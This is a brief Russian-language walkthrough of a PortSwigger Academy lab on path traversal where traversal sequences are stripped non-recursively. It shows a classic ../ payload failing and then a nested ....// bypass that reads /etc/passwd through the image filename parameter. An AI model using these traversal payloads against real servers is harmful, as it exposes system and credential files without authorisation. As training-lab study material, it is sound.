При загрузке веб-ресурса заметим, что идут отдельные GET запросы к веб-серверу и отправим данный запрос в repeater
```
GET /image?filename=51.jpg
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/3.%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20non-recursively/pics%20for%20walktrough/1.png)

Применим уязвимость Path traversal в ее классическом стиле
```
GET /image?filename=../../../etc/passwd
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/3.%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20non-recursively/pics%20for%20walktrough/2.png)

Получаем, что она не работает в ее классическом стиле. Изменим на вложенную систему обхода `....//` или  `....\/`, которые вернутся к простым последовательностям обхода при удалении внутренней последовательности

```
GET /image?filename=....//....//....//etc//passwd
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/3.%20Directory%20traversal/3.%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20non-recursively/pics%20for%20walktrough/3.png)

Тем самым, мы добрались до заветного файла /etc/passwd
